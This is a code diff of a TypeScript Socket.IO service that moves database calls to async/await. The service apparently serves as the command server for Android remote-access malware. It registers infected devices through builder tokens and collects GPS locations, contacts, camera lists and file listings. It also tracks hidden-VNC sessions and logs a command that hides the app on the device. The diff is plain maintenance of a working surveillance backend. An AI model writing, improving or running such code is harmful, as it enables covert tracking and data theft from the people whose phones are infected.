@@ -105,7 +105,7 @@ class SocketService {
     socket.join(`user:${user.userId}`);
   }
 
-  private handleConnection(socket: Socket): void {
+  private async handleConnection(socket: Socket): Promise<void> {
     const id = socket.handshake.query.id as string;
     const model = socket.handshake.query.model as string || '';
     const manf = socket.handshake.query.manf as string || '';
@@ -127,7 +127,7 @@ class SocketService {
       oldSocket.disconnect(true);
     }
     const d = getDb();
-    const existing = d.select().from(clients).where(eq(clients.id, id)).get();
+    const existing = (await d.select().from(clients).where(eq(clients.id, id)).limit(1))[0];
     if (existing?.ownerId && builderUserId && existing.ownerId !== builderUserId) {
       log.warn(`Socket: Rejecting device ${id}: owner: ${existing.ownerId}, token: ${builderUserId}`);
       socket.disconnect(true);
@@ -144,14 +144,14 @@ class SocketService {
       if (builderUserId && !existing.ownerId) {
         updates.ownerId = builderUserId;
       }
-      d.update(clients).set(updates).where(eq(clients.id, id)).run();
+      await d.update(clients).set(updates).where(eq(clients.id, id));
       this.ensureClientData(id);
     } else {
-      d.insert(clients).values({
-        id, ip, country, city, timezone, online: true,
-        ownerId: builderUserId || null,
-        deviceModel: model, deviceBrand: manf, deviceVersion: release,
-      }).run();
+      await d.insert(clients).values({
+                id, ip, country, city, timezone, online: true,
+                ownerId: builderUserId || null,
+                deviceModel: model, deviceBrand: manf, deviceVersion: release,
+              });
       this.ensureClientData(id);
     }
     this.sockets.set(id, socket);
@@ -169,10 +169,10 @@ class SocketService {
     socket.on('error', (err) => { log.error(`Socket err: ${id}: ${err instanceof Error ? err.message : String(err)}`); });
   }
 
-  private handleDisconnect(id: string, socket: Socket): void {
+  private async handleDisconnect(id: string, socket: Socket): Promise<void> {
     if (this.sockets.get(id) !== socket) return;
     const d = getDb();
-    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, id)).run();
+    await d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, id));
     this.sockets.delete(id);
     this.deviceOwners.delete(id);
     this.hvncRate.delete(id);
@@ -235,7 +235,7 @@ class SocketService {
     }
   }
 
-  private setupHandlers(socket: Socket, id: string): void {
+  private async setupHandlers(socket: Socket, id: string): Promise<void> {
     const d = getDb();
     const broadcastData = (dataType: string) => {
       this.io.to('admin').emit('client:data', { id, dataType });
@@ -305,7 +305,7 @@ class SocketService {
         }
       } catch (err: unknown) { log.error(`Contacts: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.LOCATION, (data: any) => {
+    socket.on(CMD.LOCATION, async (data: any) => {
       try {
         const locList = Array.isArray(data.locations) ? data.locations
           : Array.isArray(data.locationList) ? data.locationList
@@ -369,9 +369,9 @@ class SocketService {
           gpsData.splice(0, gpsData.length - MAX_GPS_ENTRIES);
         }
         dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
-        d.update(clients).set({
-          lastSeen: new Date().toISOString(),
-        }).where(eq(clients.id, id)).run();
+        await d.update(clients).set({
+                    lastSeen: new Date().toISOString(),
+                  }).where(eq(clients.id, id));
         dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat, lng }));
         this.markCommandResponded(id, CMD.LOCATION, `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
         broadcastData('gps');
@@ -556,7 +556,7 @@ class SocketService {
         broadcastData('permissions');
       } catch (err: unknown) { log.error(`PermCheck: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.INFO, (data: Record<string, unknown>) => {
+    socket.on(CMD.INFO, async (data: Record<string, unknown>) => {
       try {
         const normalized = normalizeDeviceInfo(data);
         const updates: Record<string, unknown> = { deviceInfo: JSON.stringify(normalized) };
@@ -565,27 +565,27 @@ class SocketService {
           updates.deviceBrand = data.brand as string;
           updates.deviceVersion = (data.androidVersion || data.version) as string;
         }
-        d.update(clients).set(updates).where(eq(clients.id, id)).run();
+        await d.update(clients).set(updates).where(eq(clients.id, id));
         dbHelpers.addLog('DATA', 'DEVICE', `Device info from ${id}`);
         this.markCommandResponded(id, CMD.INFO, 'Device info updated');
         this.broadcastToDeviceOwner(id, 'client:update', { id, dataType: 'info' });
       } catch (err: unknown) { log.error(`Info: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.FASON, (data: any) => {
+    socket.on(CMD.FASON, async (data: any) => {
       try {
         const hidden = !!data.hidden;
-        d.update(clients).set({ fasonHidden: hidden }).where(eq(clients.id, id)).run();
+        await d.update(clients).set({ fasonHidden: hidden }).where(eq(clients.id, id));
         dbHelpers.addLog('DATA', 'FASON', `App ${hidden ? 'hidden' : 'shown'} on ${id}`);
         this.markCommandResponded(id, CMD.FASON, hidden ? 'Hidden' : 'Shown');
         this.broadcastToDeviceOwner(id, 'client:update', { id, dataType: 'fason' });
       } catch (err: unknown) { log.error(`Fason: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.CAMERA, (data: any) => {
+    socket.on(CMD.CAMERA, async (data: any) => {
       try {
         const camList = data.camList || (Array.isArray(data.cameras) ? data.cameras : null);
         if (camList) {
           const camData = Array.isArray(data.list) ? data.list : camList;
-          d.update(clients).set({ cameraPermission: data.hasPermission !== undefined ? !!data.hasPermission : (data.permission !== undefined ? !!data.permission : true) }).where(eq(clients.id, id)).run();
+          await d.update(clients).set({ cameraPermission: data.hasPermission !== undefined ? !!data.hasPermission : (data.permission !== undefined ? !!data.permission : true) }).where(eq(clients.id, id));
           dbHelpers.setClientData(id, 'cameras', JSON.stringify(camData));
           dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: camData.length }));
           this.markCommandResponded(id, CMD.CAMERA, `${camData.length} cameras`);
@@ -652,12 +652,12 @@ class SocketService {
         }
       } catch (err: unknown) { log.error(`Camera: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.FILES, (data: any) => {
+    socket.on(CMD.FILES, async (data: any) => {
       try {
         if (data.type === 'list' || (Array.isArray(data.list) && !data.type)) {
           const normalizedList = normalizeFileList(data.list || []);
           dbHelpers.setClientData(id, 'files', JSON.stringify(normalizedList));
-          d.update(clients).set({ currentPath: data.path || '' }).where(eq(clients.id, id)).run();
+          await d.update(clients).set({ currentPath: data.path || '' }).where(eq(clients.id, id));
           dbHelpers.setClientData(id, 'file_error', JSON.stringify(null));
           dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length }));
           this.markCommandResponded(id, CMD.FILES, `${normalizedList.length} files`);
@@ -994,16 +994,16 @@ class SocketService {
     }
   }
 
-  setGps(clientId: string, interval: number): void {
+  async setGps(clientId: string, interval: number): Promise<void> {
     const d = getDb();
-    const existing = d.select({ id: clients.id }).from(clients).where(eq(clients.id, clientId)).get();
+    const existing = (await d.select({ id: clients.id }).from(clients).where(eq(clients.id, clientId)).limit(1))[0];
     if (!existing) {
       log.warn(`setGps: client ${clientId} not found`);
       return;
     }
     const oldTimer = this.gpsTimers.get(clientId);
     if (oldTimer) { clearInterval(oldTimer); this.gpsTimers.delete(clientId); }
-    d.update(clients).set({ gpsInterval: interval }).where(eq(clients.id, clientId)).run();
+    await d.update(clients).set({ gpsInterval: interval }).where(eq(clients.id, clientId));
     if (interval > 0) {
       if (this.sockets.has(clientId)) {
         this.send(clientId, CMD.LOCATION);
@@ -1017,9 +1017,9 @@ class SocketService {
     }
   }
 
-  private restoreGpsPolling(clientId: string): void {
+  private async restoreGpsPolling(clientId: string): Promise<void> {
     const d = getDb();
-    const client = d.select({ gpsInterval: clients.gpsInterval }).from(clients).where(eq(clients.id, clientId)).get();
+    const client = (await d.select({ gpsInterval: clients.gpsInterval }).from(clients).where(eq(clients.id, clientId)).limit(1))[0];
     if (client && client.gpsInterval != null && client.gpsInterval > 0) this.setGps(clientId, client.gpsInterval);
   }
   getOnlineCount(): number { return this.sockets.size; }
@@ -1060,14 +1060,14 @@ class SocketService {
     }
   }
 
-  cleanupStaleClients(): number {
+  async cleanupStaleClients(): Promise<number> {
     const d = getDb();
     const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
-    const result = d.delete(clients).where(and(eq(clients.online, false), lt(clients.lastSeen, cutoff))).run();
-    return result.changes;
+    const result = await d.delete(clients).where(and(eq(clients.online, false), lt(clients.lastSeen, cutoff)));
+    return result.rowCount;
   }
 
-  disconnectClient(clientId: string): void {
+  async disconnectClient(clientId: string): Promise<void> {
     const socket = this.sockets.get(clientId);
     if (socket) {
       socket.removeAllListeners('disconnect');
@@ -1077,7 +1077,7 @@ class SocketService {
     this.deviceOwners.delete(clientId);
     this.hvncRate.delete(clientId);
     const d = getDb();
-    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, clientId)).run();
+    await d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, clientId));
     const timer = this.gpsTimers.get(clientId);
     if (timer) { clearInterval(timer); this.gpsTimers.delete(clientId); }
     for (const [transferId, transfer] of this.transfers) {
